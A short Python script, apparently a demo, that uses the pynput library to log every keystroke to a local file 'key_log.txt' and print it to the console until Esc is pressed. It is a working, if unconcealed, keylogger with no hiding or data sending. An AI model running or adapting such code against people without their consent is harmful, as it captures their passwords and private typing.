import pynput
from pynput.keyboard import Key, Listener

# The file where keystrokes will be logged
log_file = "key_log.txt"

# Function to log keypresses
def on_press(key):
    try:
        print(f"Key pressed: {key}")
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write(f" [{key}] ")

# Function to stop logging when 'Esc' key is pressed
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Setting up the listener for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
